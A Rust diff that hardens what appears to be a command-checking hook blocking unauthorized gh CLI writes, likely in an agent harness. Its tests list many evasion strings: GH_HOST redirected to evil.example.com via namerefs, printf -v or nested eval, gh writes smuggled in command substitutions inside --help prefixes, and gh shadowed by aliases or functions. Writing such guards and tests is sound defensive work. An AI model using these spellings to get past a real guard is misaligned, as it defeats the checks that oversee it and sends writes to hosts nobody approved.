@@ -629,6 +629,89 @@ const VAR_SETTING_BUILTINS: &[&str] = &[
     "exec",
 ];
 
+/// Builtins that write a variable named by an operand rather than by a
+/// `NAME=value` word — see [`indirect_name_operands`].
+const NAME_OPERAND_BUILTINS: &[&str] = &["read", "printf", "mapfile", "readarray", "getopts"];
+
+/// The operands of a [`NAME_OPERAND_BUILTINS`] invocation that name the
+/// variable it writes. Values of value-taking options are stepped over so a
+/// `read -p "Host: "` prompt is not mistaken for a name.
+fn indirect_name_operands(builtin: &str, args: &[String]) -> Vec<String> {
+    // Redirections are not operands: drop `<<<word`, `2>/dev/null`, and a bare
+    // operator together with its target.
+    let mut kept = Vec::new();
+    let mut i = 0;
+    while i < args.len() {
+        let arg = &args[i];
+        let body = arg.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
+        if body.starts_with(['<', '>']) {
+            let operator_only = body.chars().all(|c| matches!(c, '<' | '>' | '&' | '|'));
+            i += if operator_only { 2 } else { 1 };
+            continue;
+        }
+        kept.push(arg.clone());
+        i += 1;
+    }
+    let args = &kept[..];
+    let mut names = Vec::new();
+    match builtin {
+        "printf" => {
+            let mut i = 0;
+            while i < args.len() {
+                if args[i] == "-v" {
+                    if let Some(name) = args.get(i + 1) {
+                        names.push(name.clone());
+                    }
+                    i += 2;
+                } else if let Some(name) = args[i].strip_prefix("-v") {
+                    names.push(name.to_string());
+                    i += 1;
+                } else {
+                    break;
+                }
+            }
+        }
+        "getopts" => {
+            if let Some(name) = args.iter().filter(|a| !a.starts_with('-')).nth(1) {
+                names.push(name.clone());
+            }
+        }
+        _ => {
+            // read / mapfile / readarray: options, then name operands.
+            let (value_opts, name_opts) = if builtin == "read" {
+                ("dinNptu", "a")
+            } else {
+                ("dnOsuCc", "")
+            };
+            let mut i = 0;
+            while i < args.len() {
+                let arg = &args[i];
+                if arg == "--" {
+                    names.extend(args[i + 1..].iter().cloned());
+                    break;
+                }
+                if let Some(cluster) = arg.strip_prefix('-').filter(|c| !c.is_empty()) {
+                    let last = cluster.chars().last().unwrap_or(' ');
+                    if value_opts.contains(last) || name_opts.contains(last) {
+                        if name_opts.contains(last)
+                            && let Some(name) = args.get(i + 1)
+                        {
+                            names.push(name.clone());
+                        }
+                        i += 2;
+                    } else {
+                        i += 1;
+                    }
+                    continue;
+                }
+                names.push(arg.clone());
+                i += 1;
+            }
+        }
+    }
+    names
+}
+
 /// Builtins that declare a variable from `NAME[=value]` arguments. Each argument
 /// is judged by its NAME, not by whether the text mentions `GH_HOST`: the shell
 /// expands the word before the builtin reads it, so `export GH_HOS${X}T=evil`
@@ -764,12 +847,26 @@ impl GhHostEnv {
             return;
         }
         // `eval` runs its words in THIS shell, so an export inside it counts.
-        if command == Some("eval") && depth < MAX_EVAL_DEPTH {
+        // Past the nesting cap its words go unread, so the host is unknown
+        // (#1073 review I-d).
+        if command == Some("eval") {
+            if depth >= MAX_EVAL_DEPTH {
+                self.add_unresolved();
+                return;
+            }
             for inner in command_segments(&rest[1..].join(" ")) {
                 if !segment_invokes_gh(&inner) {
                     self.observe_depth(&inner, depth + 1);
                 }
             }
+        }
+        if let Some(name) = command.filter(|c| NAME_OPERAND_BUILTINS.contains(c))
+            && indirect_name_operands(name, &rest[1..])
+                .iter()
+                .any(|operand| !is_literal_identifier(operand) || operand == "GH_HOST")
+        {
+            // `printf -v GH_HOS${X}T …`, `read GH_HOS${X}T` (#1073 review I-c).
+            self.add_unresolved();
         }
 
         match command {
@@ -829,6 +926,22 @@ impl GhHostEnv {
     /// arguments. See [`DECLARING_BUILTINS`].
     fn observe_declaration(&mut self, builtin: &str, args: &[String]) {
         let unexport = builtin == "export" && args.iter().any(|w| w == "-n");
+        // A nameref (`declare -n r=GH_HOST`) makes every later write to `r` a
+        // write to its target, which no later segment spells. Any nameref, or
+        // any value naming GH_HOST, is unresolved (#1073 review I-c).
+        let nameref = builtin != "export"
+            && args
+                .iter()
+                .any(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('n'));
+        if nameref
+            || (builtin != "export"
+                && args.iter().any(|w| {
+                    w.split_once('=')
+                        .is_some_and(|(_, v)| v.contains("GH_HOST"))
+                }))
+        {
+            self.add_unresolved();
+        }
         for word in args {
             if word.starts_with('-') || word.starts_with('+') {
                 continue;
@@ -2192,6 +2305,9 @@ fn gh_args_are_pure_help(args: &[String]) -> bool {
 /// `env`, `sudo` and the rest are refused for the same reason, without
 /// enumerating them.
 fn segment_is_pure_help(segment: &str) -> bool {
+    if has_command_substitution(segment) {
+        return false;
+    }
     let tokens = tokenize(segment);
     let mut words: &[String] = &tokens;
     while words
@@ -2200,33 +2316,76 @@ fn segment_is_pure_help(segment: &str) -> bool {
     {
         words = &words[1..];
     }
-    while words.first().is_some_and(|w| is_plain_assignment(w)) {
+    while words.first().is_some_and(|w| help_prefix_ok(w)) {
         words = &words[1..];
     }
     words.first().map(String::as_str) == Some("gh") && gh_args_are_pure_help(&words[1..])
 }
 
-/// The top-level segments of `command` that are pure help invocations and do
-/// NOT sit on the right-hand side of a pipe — the only segments the per-segment
-/// gate may skip as help (#868). A pipe hands the command stdin, which is how
-/// `xargs` turns data into arguments; refusing every pipe right-hand side keeps
-/// that door shut even for spellings this check does not model.
-fn pure_help_segments(command: &str) -> Vec<String> {
+/// A substitution that runs a command: `$(…)`, a backtick, `<(…)`, `>(…)`. In a
+/// help segment's prefix it would run an arbitrary command — possibly a gh
+/// write — as a side effect of the "read" (#1073 review I-b).
+fn has_command_substitution(text: &str) -> bool {
+    text.contains("$(") || text.contains('`') || text.contains("<(") || text.contains(">(")
+}
+
+/// A prefix word a pure help invocation may carry: a plain `NAME=value`
+/// assignment whose value runs nothing, and whose NAME does not steer gh.
+/// `GH_*` (host, token, config dir, pager, …), `PAGER`, `BROWSER`, `EDITOR`
+/// and `VISUAL` change what gh does or runs, so they are refused rather than
+/// argued one by one (#1073 review N-b).
+fn help_prefix_ok(word: &str) -> bool {
+    let Some((name, value)) = word.split_once('=') else {
+        return false;
+    };
+    is_plain_assignment(word)
+        && !has_command_substitution(value)
+        && !name.starts_with("GH_")
+        && !matches!(name, "PAGER" | "BROWSER" | "EDITOR" | "VISUAL")
+}
+
+/// Matches an alias or function DEFINITION named `gh` anywhere in a command:
+/// `alias gh=…`, `gh() {…}`, `function gh {…}`.
+static GH_SHADOW: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"\balias\b[^;&|\n]*(?:^|[\s'"])gh=|(?:^|[\s;&|({])gh\s*\(\s*\)|\bfunction\s+gh\b"#)
+        .expect("pattern should compile")
+});
+
+/// True when `command` defines an alias or function named `gh`. Then the word
+/// `gh` may not run the gh binary at all, so no invocation in the command earns
+/// the help exemption (#1073 review N-b).
+fn command_shadows_gh(command: &str) -> bool {
+    GH_SHADOW.is_match(command)
+}
+
+/// The top-level segments of `command`, each paired with whether it may be
+/// skipped as a pure help invocation (#868): it is [`segment_is_pure_help`],
+/// it does NOT sit on the right-hand side of a pipe, and the command defines no
+/// `gh` alias or function. A pipe hands the command stdin, which is how `xargs`
+/// turns data into arguments; refusing every pipe right-hand side keeps that
+/// door shut even for spellings this check does not model.
+fn top_level_help_exemptions(command: &str) -> Vec<(String, bool)> {
+    let shadowed = command_shadows_gh(command);
     let mut out = Vec::new();
     let mut after_pipe = false;
     for (segment, op) in split_segments_with_ops(command) {
-        if !after_pipe && segment_is_pure_help(&segment) {
-            out.push(segment.trim().to_string());
-        }
+        let exempt = !shadowed && !after_pipe && segment_is_pure_help(&segment);
+        out.push((segment.trim().to_string(), exempt));
         after_pipe = op == Some("|");
     }
     out
 }
 
 /// [`looped_write_kind`] for one loop-analysis command, with a pure help
-/// request read as a read (#868).
-fn looped_command_kind(c: &loop_analysis::LoopedCommand) -> LoopedWriteKind {
-    if gh_args_are_pure_help(&c.args) {
+/// request read as a read (#868) — under the same conditions the per-segment
+/// gate applies: a plain prefix ([`help_prefix_ok`]), not fed by a pipe, and no
+/// `gh` alias or function in the command (#1073 review I-a).
+fn looped_command_kind(c: &loop_analysis::LoopedCommand, gh_shadowed: bool) -> LoopedWriteKind {
+    if !gh_shadowed
+        && !c.piped_into
+        && c.prefix.iter().all(|w| help_prefix_ok(w))
+        && gh_args_are_pure_help(&c.args)
+    {
         return LoopedWriteKind::ReadOrAllowed;
     }
     looped_write_kind(&format!("gh {}", c.args.join(" ")))
@@ -2480,6 +2639,8 @@ impl Check for GhWriteGuard {
         let allowed_repos = env_allow_entries("CADENCE_ALLOWED_REPOS");
         let extra_hosts = env_extra_hosts();
 
+        let gh_shadowed = command_shadows_gh(command);
+
         // AST-based loop detection with regex fallback
         match loop_analysis::analyze_gh_loops(command) {
             LoopAnalysis::AllTargetsExplicit(cmds) => {
@@ -2490,7 +2651,7 @@ impl Check for GhWriteGuard {
                 for c in &cmds {
                     if let LoopedWriteKind::ApiUnverifiable {
                         undeterminable_query,
-                    } = looped_command_kind(c)
+                    } = looped_command_kind(c, gh_shadowed)
                     {
                         return api_unverifiable_block(
                             &format!("gh {}", c.args.join(" ")),
@@ -2503,7 +2664,7 @@ impl Check for GhWriteGuard {
                 let dh = default_host();
                 let unowned_write_targets: Vec<&str> = cmds
                     .iter()
-                    .filter(|c| looped_command_kind(c) == LoopedWriteKind::RepoWrite)
+                    .filter(|c| looped_command_kind(c, gh_shadowed) == LoopedWriteKind::RepoWrite)
                     .filter(|c| {
                         !c.explicit_repo
                             .as_ref()
@@ -2534,7 +2695,7 @@ impl Check for GhWriteGuard {
                 for c in &cmds {
                     if let LoopedWriteKind::ApiUnverifiable {
                         undeterminable_query,
-                    } = looped_command_kind(c)
+                    } = looped_command_kind(c, gh_shadowed)
                     {
                         return api_unverifiable_block(
                             &format!("gh {}", c.args.join(" ")),
@@ -2546,7 +2707,7 @@ impl Check for GhWriteGuard {
                 }
                 let has_write = cmds
                     .iter()
-                    .any(|c| looped_command_kind(c) == LoopedWriteKind::RepoWrite);
+                    .any(|c| looped_command_kind(c, gh_shadowed) == LoopedWriteKind::RepoWrite);
                 if has_write {
                     // Relaxed-when-deterministic policy (#44): a loop whose
                     // body never changes directory, running in an owned
@@ -2570,7 +2731,8 @@ impl Check for GhWriteGuard {
                             .iter()
                             .filter(|c| {
                                 c.explicit_repo.is_none()
-                                    && looped_command_kind(c) == LoopedWriteKind::RepoWrite
+                                    && looped_command_kind(c, gh_shadowed)
+                                        == LoopedWriteKind::RepoWrite
                             })
                             .map(|c| format!("`gh {}`", c.args.join(" ")))
                             .collect();
@@ -2615,9 +2777,21 @@ impl Check for GhWriteGuard {
         let cwd = input.cwd.as_deref().unwrap_or(".");
         let work_dir = parse_work_dir(command, cwd);
         let mut gh_host_env = GhHostEnv::from_process();
-        let pure_help = pure_help_segments(command);
+        // Segment identity for the help exemption is positional: the flat
+        // segment list meets each top-level segment in order, so a cursor
+        // pairs every exemption with exactly one segment, never with any
+        // segment that merely has the same text (#1073 review N-a).
+        let top_level = top_level_help_exemptions(command);
+        let mut top_cursor = 0;
 
         for segment in command_segments(command) {
+            let exempt_as_help = match top_level.get(top_cursor) {
+                Some((text, exempt)) if text == segment.trim() => {
+                    top_cursor += 1;
+                    *exempt
+                }
+                _ => false,
+            };
             // Before the gate: an `export GH_HOST=…` segment invokes no gh, but
             // it decides which host every later gh write reaches (#548). A gh
             // segment is a child process and cannot change it.
@@ -2632,7 +2806,7 @@ impl Check for GhWriteGuard {
 
             // `gh <noun> <verb> --help` prints help and writes nothing (#868).
             // Only a top-level, bare, non-pipe-fed invocation qualifies.
-            if pure_help.iter().any(|p| p == segment.trim()) && segment_is_pure_help(&segment) {
+            if exempt_as_help && segment_is_pure_help(&segment) {
                 continue;
             }
 
@@ -6735,5 +6909,147 @@ mod tests {
                 assert_eq!(meta.rule_id, "gh-write-unauthorized-target", "{command}");
             }
         });
+    }
+
+    // --- #1073 delta review: suspected gaps, tested before the fix ---
+
+    /// Run one delta case, recording a mismatch instead of panicking so a
+    /// test reports every failing case at once.
+    fn run_case(bad: &mut Vec<String>, command: &str, block: bool) {
+        let mut blocked = false;
+        with_env(&owners_env(), || {
+            let result = GhWriteGuard.run(&input_with(command, "/tmp"));
+            blocked = matches!(result.outcome, cadence_hooks_core::Outcome::Block);
+        });
+        if blocked != block {
+            bad.push(format!("expected block={block}: {command}"));
+        }
+    }
+
+    #[test]
+    fn delta_ia_loop_help_obeys_the_segment_conditions() {
+        let mut bad = Vec::new();
+        run_case(
+            &mut bad,
+            "for i in 1 2; do X=1 gh issue create --help; done",
+            false,
+        );
+        run_case(
+            &mut bad,
+            r#"for i in 1 2; do NAME="$(gh issue create -R evil/x -t t)" gh issue create --help; done"#,
+            true,
+        );
+        run_case(
+            &mut bad,
+            "for i in 1 2; do echo --help=false | gh issue create --help; done",
+            true,
+        );
+        assert!(bad.is_empty(), "{bad:#?}");
+    }
+
+    #[test]
+    fn delta_ib_substitution_in_a_help_prefix_blocks() {
+        let mut bad = Vec::new();
+        for command in [
+            r#"NAME="$(gh issue create -R evil/x -t t)" gh issue create --help"#,
+            "NAME=`gh issue create -R evil/x -t t` gh issue create --help",
+            r#"for i in 1; do NAME="$(gh issue create -t t)" gh issue create --help; done"#,
+            "NAME=<(gh issue create -t t) gh issue create --help",
+        ] {
+            run_case(&mut bad, command, true);
+        }
+        // Without a substitution the prefix is fine.
+        run_case(&mut bad, "NAME=plain gh issue create --help", false);
+        assert!(bad.is_empty(), "{bad:#?}");
+    }
+
+    #[test]
+    fn delta_ic_namerefs_and_indirect_names_block() {
+        let mut bad = Vec::new();
+        for command in [
+            "declare -n r=GH_HOST; r=evil.example.com; export GH_HOST; gh pr create -R cameronsjo/x -t t",
+            "declare -n r=GH_HOST; r=evil.example.com; gh pr create -R cameronsjo/x -t t",
+            "typeset -n r=GH_HOST; r=evil.example.com; export r; gh pr create -R cameronsjo/x -t t",
+            "declare X=GH_HOST; declare -n r=$X; export r=evil.example.com; gh pr create -R cameronsjo/x -t t",
+            // An owned host exported first, so only the indirect write can
+            // make these block.
+            "export GH_HOST=github.com; printf -v GH_HOS${X}T evil; gh pr create -R cameronsjo/x -t t",
+            "export GH_HOST=github.com; read GH_HOS${X}T <<<evil; gh pr create -R cameronsjo/x -t t",
+            "export GH_HOST=github.com; mapfile -t GH_HOS${X}T <<<evil; gh pr create -R cameronsjo/x -t t",
+            "export GH_HOST=github.com; getopts ab GH_HOS${X}T; gh pr create -R cameronsjo/x -t t",
+            "export GH_HOST=github.com; declare -n r=GH_HOST; r=evil.example.com; gh pr create -R cameronsjo/x -t t",
+            "export GH_HOST=github.com; local -n r=GH_HOST; gh pr create -R cameronsjo/x -t t",
+            "printf -v GH_HOS${X}T evil; gh pr create -R cameronsjo/x -t t",
+            "read GH_HOS${X}T <<<evil; gh pr create -R cameronsjo/x -t t",
+            "mapfile -t GH_HOS${X}T <<<evil; gh pr create -R cameronsjo/x -t t",
+            "getopts ab GH_HOS${X}T; gh pr create -R cameronsjo/x -t t",
+        ] {
+            run_case(&mut bad, command, true);
+        }
+        // A literal, unrelated name is still nothing.
+        run_case(
+            &mut bad,
+            "printf -v OUT '%s' x; read LINE <<<y; read -r -p 'Host name: ' H < /dev/tty; mapfile -t LINES < f; gh pr create -R cameronsjo/x -t t",
+            false,
+        );
+        assert!(bad.is_empty(), "{bad:#?}");
+    }
+
+    #[test]
+    fn delta_id_eval_past_the_depth_cap_is_unresolved() {
+        let mut bad = Vec::new();
+        run_case(
+            &mut bad,
+            r#"eval "eval \"eval \\\"eval export GH_HOST=evil.example.com\\\"\""; gh pr create -R cameronsjo/x -t t"#,
+            true,
+        );
+        run_case(
+            &mut bad,
+            "eval eval eval eval export GH_HOST=evil.example.com; gh pr create -R cameronsjo/x -t t",
+            true,
+        );
+        run_case(
+            &mut bad,
+            "eval eval eval eval export GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x -t t",
+            true,
+        );
+        run_case(
+            &mut bad,
+            "eval eval eval eval eval export GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x -t t",
+            true,
+        );
+        assert!(bad.is_empty(), "{bad:#?}");
+    }
+
+    #[test]
+    fn delta_nb_help_refuses_env_steering_prefixes_and_gh_shadows() {
+        let mut bad = Vec::new();
+        for command in [
+            "GH_HOST=evil gh issue create --help",
+            "GH_PAGER=x gh issue create --help",
+            "PAGER=x gh issue create --help",
+            "BROWSER=x gh issue create --help",
+            "EDITOR=x gh issue create --help",
+            "VISUAL=x gh issue create --help",
+            "alias gh='gh issue create -t t -b b #'; gh issue create --help",
+            "gh() { command gh issue create -t t -b b; }; gh issue create --help",
+            "function gh { command gh issue create -t t; }; gh issue create --help",
+        ] {
+            run_case(&mut bad, command, true);
+        }
+        assert!(bad.is_empty(), "{bad:#?}");
+    }
+
+    #[test]
+    fn delta_na_help_skip_is_positional_not_textual() {
+        let mut bad = Vec::new();
+        // The same text in a pipe right-hand side must not borrow the
+        // top-level segment's exemption.
+        run_case(
+            &mut bad,
+            "gh issue create --help; echo x | gh issue create --help",
+            true,
+        );
+        assert!(bad.is_empty(), "{bad:#?}");
     }
 }
